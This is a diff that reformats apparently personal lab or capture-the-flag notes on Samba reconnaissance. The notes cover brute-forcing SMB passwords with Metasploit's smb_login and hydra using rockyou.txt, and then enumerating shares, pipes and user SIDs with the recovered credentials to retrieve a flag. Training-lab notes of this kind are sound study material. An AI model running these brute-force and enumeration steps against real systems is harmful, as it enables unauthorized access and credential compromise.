@@ -129,38 +129,39 @@ commands
 		cat flag
 
 ### Samba Recon: Dictionary Attack
+
 what is the password of user jane required to access share jane
-	msfconsole
-	use auxiliary/scanner/smb/smb_login
-	set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
-	set SMBUser jane
-	set RHOSTS ip
-	exploit
+	- msfconsole
+	- use auxiliary/scanner/smb/smb_login
+	- set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+	- set SMBUser jane
+	- set RHOSTS ip
+	- exploit
 what is the password of user admin to access share admin using hydra with password wordlists 
-	gzip -d /usr/share/wordlists/rockyou.txt.gz
-	hydra -l admin -P /usr/share/wordlists/rockyou.txt ip smb
+	- gzip -d /usr/share/wordlists/rockyou.txt.gz
+	- hydra -l admin -P /usr/share/wordlists/rockyou.txt ip smb
 which share is read only use smbmap with credentials 
-	smbmap -H ip -u admin -p password1
+	- smbmap -H ip -u admin -p password1
 u could browse jane shares
-	smbclient -L ip -U jane
+	- smbclient -L ip -U jane
 get the flag from share admin
-	smbclient //ip/admin -U admin
-	ls 
-	cd hidden
-	ls
-	get flag.tar.gz
-	exit
-	tar -xf flag.tar.gz
-	cat flag
+	- smbclient //ip/admin -U admin
+	- ls 
+	- cd hidden
+	- ls
+	- get flag.tar.gz
+	- exit
+	- tar -xf flag.tar.gz
+	- cat flag
 u can list the pipes available on smb server using msfconsole
-	msfconsole
-	use auxiliary/scanner/smb/pipe_auditor
-	set SMBUser admin
-	set SMBPass password1
-	set RHOSTS ip
-	exploit
+	- msfconsole
+	- use auxiliary/scanner/smb/pipe_auditor
+	- set SMBUser admin
+	- set SMBPass password1
+	- set RHOSTS ip
+	- exploit
 list sid of unix users 
-	enum4linux -r -u "admin" -p "password1" ip
+	- enum4linux -r -u "admin" -p "password1" ip
 
 
 ### ProFTP Recon: Basics
